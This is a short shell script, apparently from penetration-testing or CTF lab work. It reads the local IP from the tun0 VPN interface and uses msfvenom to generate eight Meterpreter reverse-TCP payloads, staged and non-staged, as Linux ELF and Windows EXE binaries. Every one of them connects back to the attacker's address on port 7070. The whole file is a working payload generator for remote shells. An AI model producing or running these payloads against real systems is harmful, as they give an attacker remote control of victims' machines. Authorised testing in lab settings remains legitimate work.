# check IP
export IPADDR=`ip -brief address show tun0 | awk '{print $3}' | awk -F/ '{print $1}'`

echo "IPADDR = $IPADDR"

# generate non-staged payloads with IP
# linux non-staged reverse TCP
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_86_ns_meterpeter_reverse_tcp.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_64_ns_meterpeter_reverse_tcp.elf
# linux staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_86_meterpeter_reverse_tcp.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f elf > linux_64_meterpeter_reverse_tcp.elf
# windows non-staged reverse TCP
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_86_ns_meterpeter_reverse_tcp.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_64_ns_meterpeter_reverse_tcp.exe
# windows staged reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_86_meterpeter_reverse_tcp.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=7070 -f exe > windows_64_meterpeter_reverse_tcp.exe
